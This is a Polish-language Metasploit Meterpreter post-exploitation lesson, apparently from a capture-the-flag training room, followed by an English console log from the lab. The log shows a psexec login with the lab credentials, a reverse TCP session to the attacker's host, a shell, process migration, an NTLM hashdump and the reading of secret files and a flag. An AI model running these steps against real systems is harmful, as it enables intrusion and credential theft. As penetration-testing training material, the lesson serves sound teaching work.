Inne przydatne polecenia Kiwi obejmują `lsa_dump_sam`(zrzuca bazę danych SAM, podobne do `hashdump`), `lsa_dump_secrets`(zrzuca sekrety LSA) i `golden_ticket_create`(w przypadku ataków Kerberos w środowiskach Active Directory, omówionych w module AD).

> **Uwaga** : `load kiwi`zastąpiono starszą `load mimikatz`komendę. Jeśli wpiszesz `load mimikatz`, Metasploit automatycznie załaduje Kiwi.

## Ładowanie Pythona

Aby uzyskać większą elastyczność pisania skryptów na komputerze docelowym, możesz załadować rozszerzenie Pythona:

Terminal AttackBox

```shell-session
meterpreter > load python
Loading extension python...Success.
meterpreter > python_execute "import os; print(os.environ['COMPUTERNAME'])"
[+] Content written to stdout:
STRATFORD-WS01
```

Dzięki temu otrzymasz pełny interpreter języka Python w środkuMeterpretersesja, przydatna do uruchamiania niestandardowych skryptów, analizowania danych lub automatyzowania powtarzających się zadań bez konieczności przesyłania niezależnych narzędzi.

## Uruchamianie modułów poeksploatacyjnych

Oprócz wbudowanych poleceń i rozszerzeń,Metasploitposiada pełną bibliotekę **modułów posteksploatacyjnych** ( `post/`kategoria z pokoju 1). Moduły te działają _w ramach_ istniejącej sesji, wykorzystując `SESSION`parametr do określenia, na której sesji mają działać.

Oto przepływ pracy:

1. Utwórz tło sesji Meterpretera
2. Załaduj moduł postu za pomocą`use`
3. Ustaw `SESSION`parametr na identyfikator sesji
4. Uruchom moduł

Rozważmy przykład. Chcesz wyliczyć domenę, do której należy STRATFORD-WS01:

Terminal AttackBox

```shell-session
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/smb/ms17_010_eternalblue) > use post/windows/gather/enum_domain
msf6 post(windows/gather/enum_domain) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/enum_domain) > run

[+] FOUND Domain: STRATFORD
[+] FOUND Domain Controller: STRATFORD-DC (IP: 10.10.14.55)
[*] Post module execution completed
msf6 post(windows/gather/enum_domain) >
```

W module wykorzystano sesję 1 (nasząMeterpretersesja na STRATFORD-WS01) w celu zapytania o domenę i odkrycia kontrolera domeny. Ten schemat: tło → użyj modułu post → ustaw SESJĘ → uruchom, to sposób na rozszerzenieMeterpretermożliwości Metasploit z całą biblioteką poeksploatacyjną.

Inne powszechnie używane moduły postprodukcyjne obejmują:

- `post/windows/gather/enum_shares`— Wyświetla udziały sieciowe
- `post/windows/gather/enum_applications`— Wyświetla listę zainstalowanych aplikacji
- `post/multi/gather/env`— Zrzuca zmienne środowiskowe
- `post/multi/manage/shell_to_meterpreter`— Uaktualnia podstawową sesję powłoki do Meterpretera

Możesz wyszukiwać moduły postów za pomocą `search type:post <keyword>`wiersza `msfconsole`poleceń.

Czas wszystko połączyć. W tym zadaniu uzyskasz początkowy dostęp do stacji roboczej Stratford Systems, korzystając z podanych danych uwierzytelniających, a następnie użyjeszMeterpreterpolecenia i techniki posteksploatacyjne z poprzednich zadań, aby zbadać cel i odpowiedzieć na poniższe pytania.

Jeśli jeszcze tego nie zrobiłeś, naciśnij przycisk **Start Machine poniżej.**

## Zdobycie pierwszego punktu zaczepienia

Użyj tego `exploit/windows/smb/psexec`modułu, aby uzyskać sesję Meterpretera na celu. Ten moduł uwierzytelnia się do SMB Usługa używa prawidłowych danych uwierzytelniających i wykonuje ładunek, zapewniając interaktywną sesję bez konieczności wykorzystywania luki w zabezpieczeniach. Podczas uruchamiania tego modułu Metasploit uruchamia usługę PSEXEC na hoście docelowym, ale czasami usługa ta może nie uruchamiać się wystarczająco szybko. **Jeśli moduł nie udostępni powłoki Meterpretera, uruchom go ponownie.**

Użyj następujących danych logowania:

- **Nazwa użytkownika** :`ballen`
- **Hasło** :`Password1`

Oto konfiguracja:

Terminal AttackBox

```shell-session
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.128.135.52
RHOSTS => 10.128.135.52
msf6 exploit(windows/smb/psexec) > set SMBUser ballen
SMBUser => ballen
msf6 exploit(windows/smb/psexec) > set SMBPass Password1
SMBPass => Password1
msf6 exploit(windows/smb/psexec) > set LHOST 10.128.117.174
LHOST => ATTACKER_IP
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.128.117.174:4444
[*] 10.128.135.52:445 - Connecting to the server...
[*] 10.128.135.52:445 - Authenticating to 10.128.135.52:445|STRATFORD as user 'ballen'...
[*] 10.128.135.52:445 - Selecting PowerShell target
[*] 10.128.135.52:445 - Executing the payload...
[*] Sending stage (201283 bytes) to 10.128.135.52
[*] Meterpreter session 1 opened (10.128.117.174:4444 -> 10.128.135.52:49182) at 2026-03-18 16:15:42 +0000

meterpreter >
```

Teraz masz Meterpretersesja. Użyj poleceń i technik z zadań 3 i 4, aby odpowiedzieć na poniższe pytania.

**Wskazówki przed rozpoczęciem:**

- Niektóre pytania wymagają użycia modułów posteksploatacyjnych. Pamiętaj o schemacie: `background`→ `use post/...`→ `set SESSION 1`→ `run`.
- Aby `hashdump`to zadziałało, konieczne może być `lsass.exe`najpierw przeprowadzenie migracji do procesu. Użyj `ps`, aby znaleźć jego PID, a następnie `migrate <pid>`.
- Do łamania haszyszu możesz skorzystać z usługi online, np. [CrackStation(otwiera się w nowej karcie)](https://crackstation.net/)lub lokalnego narzędzia takiego jak `john`lub `hashcat`.
- Użyj tej opcji `search -f <filename>`, aby zlokalizować pliki w miejscu docelowym. `-d C:\`W razie potrzeby dodaj opcję wyszukiwania z katalogu głównego.

podsumowanie 
W tym pokoju przeszedłeś od zrozumienia tego, coMeterpreterpolega na wykorzystaniu go jako pełnej platformy poeksploatacyjnej przeciwko celowi Stratford Systems. Podsumujmy to, co omówiłeś:

Meterpreterarchitektura :Meterpreterjest ładunkiem w pamięci, który wykorzystuje refleksjęBiblioteka DLLWstrzykiwanie, szyfrowana komunikacja i modułowa rozszerzalność zapewniają bogate w funkcje środowisko poeksploatacyjne. Jest wydajne, ale nie niewidoczne; nowoczesne.EDRRozwiązania mogą wykryć jego zachowania.

Wybór właściwegoMeterpreter:Pięć implementacji (Windows, Mettle/Linux, Jawa,PHP, Python) obejmują różne platformy docelowe. Trójczynnikowa struktura selekcji, platforma docelowaSystem operacyjny, dostępne komponenty środowiska wykonawczego i typ połączenia, za każdym razem pozwalają zawęzić wybór do właściwego ładunku.

Niezbędne polecenia : uporządkowane według przypadków użycia, a nie alfabetycznie. Świadomość sytuacyjna ( sysinfo,, getuid) ps, operacje na systemie plików ( search,, ), obsługa sieci ( , download) i interakcja z systemem operacyjnym ( , ) dają narzędzia do eksploracji i ekstrakcji danych z zainfekowanego systemu.uploadifconfignetstatshellexecute

Techniki posteksploatacyjne : migracja procesów w celu zapewnienia stabilności i kontekstu uprawnień, getsystemeskalacji uprawnień, hashdumpwyodrębniania poświadczeń, load kiwigromadzenia poświadczeń w stylu Mimikatz oraz background → use post/ → set SESSION → runwzorzec wykorzystania pełnej biblioteki modułów posteksploatacyjnych Metasploit.

We wszystkich czterech pokojach tego modułu używałeś Meterpretera jako ładunku dostarczonego przez exploit uruchomiony z msfconsole. Ale co się stanie, gdy nie uda się dotrzeć do celu za pomocą bezpośredniego exploita? Co, jeśli będziesz musiał wygenerować samodzielny plik ładunku, plik wykonywalny, powłokę internetową lub surowy kod powłoki i dostarczyć go do celu innym kanałem?

To jest główny temat kolejnego i ostatniego pokoju: Metasploit:Generowanie ładunku .

root@ip-10-128-117-174:~# msfconsole
Metasploit tip: Export your database results with db_export -f xml 
<file>
                                                  
                                   ___          ____
                               ,-""   `.      < HONK >
                             ,'  _   e )`-._ /  ----
                            /  ,' `-._<.===-'
                           /  /
                          /  ;
              _          /   ;
 (`._    _.-"" ""--..__,'    |
 <_  `-""                     \
  <`-                          :
   (__   <__.                  ;
     `-.   '-.__.      _.'    /
        \      `-.__,-'    _,'
         `._    ,    /__,-'
            ""._\__,'< <____
                 | |  `----.`.
                 | |        \ `.
                 ; |___      \-``
                 \   --<
                  `.`.<
                    `-'

       =[ metasploit v6.4.144-dev-                              ]
+ -- --=[ 2,668 exploits - 1,342 auxiliary - 2,581 payloads     ]
+ -- --=[ 435 post - 57 encoders - 14 nops - 12 evasion         ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf exploit(windows/smb/psexec) > set RHOSTS 10.128.135.52
RHOSTS => 10.128.135.52
msf exploit(windows/smb/psexec) > set SMBUser ballen
SMBUser => ballen
msf exploit(windows/smb/psexec) > set SMBPass Password1
SMBPass => Password1
msf exploit(windows/smb/psexec) > set LHOST 10.128.117.174
LHOST => 10.128.117.174
msf exploit(windows/smb/psexec) > exploit
[*] Started reverse TCP handler on 10.128.117.174:4444 
[*] 10.128.135.52:445 - Connecting to the server...
[*] 10.128.135.52:445 - Authenticating to 10.128.135.52:445 as user 'ballen'...
[*] 10.128.135.52:445 - Selecting PowerShell target
[*] 10.128.135.52:445 - Executing the payload...
[+] 10.128.135.52:445 - Service start timed out, OK if running a command or non-service executable...
[*] Exploit completed, but no session was created.
msf exploit(windows/smb/psexec) > sysinfo
[-] Unknown command: sysinfo. Run the help command for more details.
msf exploit(windows/smb/psexec) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Automatic
    1   PowerShell
    2   Native upload
    3   MOF upload
    4   Command

msf exploit(windows/smb/psexec) > set 1
[-] Unknown datastore option: 1.
Usage: set [options] [name] [value]

Set the given option to value.  If value is omitted, print the current value.
If both are omitted, print options that are currently set.

If run from a module context, this will set the value in the module's
datastore.  Use -g to operate on the global datastore.

If setting a PAYLOAD, this command can take an index from `show payloads'.

OPTIONS:

    -c, --clear   Clear the values, explicitly setting to nil (default)
    -g, --global  Operate on global datastore variables
    -h, --help    Help banner.

msf exploit(windows/smb/psexec) > exploit
[*] Started reverse TCP handler on 10.128.117.174:4444 
[*] 10.128.135.52:445 - Connecting to the server...
[*] 10.128.135.52:445 - Authenticating to 10.128.135.52:445 as user 'ballen'...
[*] 10.128.135.52:445 - Selecting PowerShell target
[*] 10.128.135.52:445 - Executing the payload...
[+] 10.128.135.52:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (199238 bytes) to 10.128.135.52
[*] Meterpreter session 1 opened (10.128.117.174:4444 -> 10.128.135.52:49785) at 2026-07-29 16:22:56 +0000

meterpreter > sysinfo
Computer        : STRATFORD-WS01
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows
meterpreter > shell
Process 1468 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>net share
net share

Share name   Resource                        Remark

-------------------------------------------------------------------------------
C$           C:\                             Default share                     
IPC$                                         Remote IPC                        
ADMIN$       C:\Windows                      Remote Admin                      
PROJECTS     C:\PROJECTS                     Startford Projects                
The command completed successfully.

C:\Windows\system32>exit
exit
meterpreter > hushdump
[-] Unknown command: hushdump. Did you mean hashdump? Run the help command for more details.
meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: Incorrect function.
meterpreter > ps

Process List
============

 PID   PPID  Name         Arch  Session  User               Path
 ---   ----  ----         ----  -------  ----               ----
 0     0     [System Pro
             cess]
 4     0     System       x64   0
 84    4     Registry     x64   0
 272   4     smss.exe     x64   0
 336   592   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\svchost.exe
 376   368   csrss.exe    x64   0
 452   444   csrss.exe    x64   1
 500   368   wininit.exe  x64   0
 520   444   winlogon.ex  x64   1        NT AUTHORITY\SYST  C:\Windows\System3
             e                           EM                 2\winlogon.exe
 592   500   services.ex  x64   0
             e
 600   592   msdtc.exe    x64   0        NT AUTHORITY\NETW  C:\Windows\System3
                                         ORK SERVICE        2\msdtc.exe
 604   592   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\svchost.exe
 616   500   lsass.exe    x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\lsass.exe
 660   592   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\System3
                                         L SERVICE          2\svchost.exe
 716   592   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\svchost.exe
 736   592   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\svchost.exe
 760   500   fontdrvhost  x64   0        Font Driver Host\  C:\Windows\System3
             .exe                        UMFD-0             2\fontdrvhost.exe
 768   520   fontdrvhost  x64   1        Font Driver Host\  C:\Windows\System3
             .exe                        UMFD-1             2\fontdrvhost.exe
 848   592   svchost.exe  x64   0        NT AUTHORITY\NETW  C:\Windows\System3
                                         ORK SERVICE        2\svchost.exe
 888   592   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\System3
                                         L SERVICE          2\svchost.exe
 900   592   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\svchost.exe
 980   592   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\svchost.exe
 988   592   svchost.exe  x64   0        NT AUTHORITY\NETW  C:\Windows\System3

 4012  592   TrustedInst  x64   0        NT AUTHORITY\SYST  C:\Windows\servici
             aller.exe                   EM                 ng\TrustedInstalle
                                                            r.exe

meterpreter > migrate 2336
[*] Migrating from 1956 to 2336...
[*] Migration completed successfully.
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dfe3378335d43f9764e581b856a662a:::
ballen:1008:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
jchambers:1009:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
meterpreter > Interrupt: use the 'exit' command to quit
meterpreter > search -f secrets.txt
Found 1 result...
=================

Path                                                            Size (bytes)  Modified (UTC)
----                                                            ------------  --------------
c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt  31            2026-03-26 14:37:28 +0000

meterpreter > cat c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt  31 
[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.
meterpreter > cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt  31"
[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.
meterpreter > cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
Twitter password: KDSvbsw3849!
meterpreter > search -f realsecret.txt
Found 1 result...
=================

Path                               Size (bytes)  Modified (UTC)
----                               ------------  --------------
c:\inetpub\wwwroot\realsecret.txt  20            2026-03-27 12:44:46 +0000

meterpreter > cat "c:\inetpub\wwwroot\realsecret.txt"
THM{Post-Spl1tation}meterpreter >
